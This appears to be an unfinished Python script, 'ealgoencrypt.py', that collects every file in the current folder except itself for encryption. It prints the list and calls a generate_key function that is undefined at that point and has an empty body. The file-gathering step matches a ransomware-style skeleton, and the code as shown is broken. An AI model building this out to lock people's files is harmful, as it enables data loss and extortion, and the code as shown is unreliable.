import ealgo as ea
import os

#Find files to encrypt within folder

files = []

for file in os.listdir():
    if file == "ealgoencrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


key = generate_key()

def generate_key():


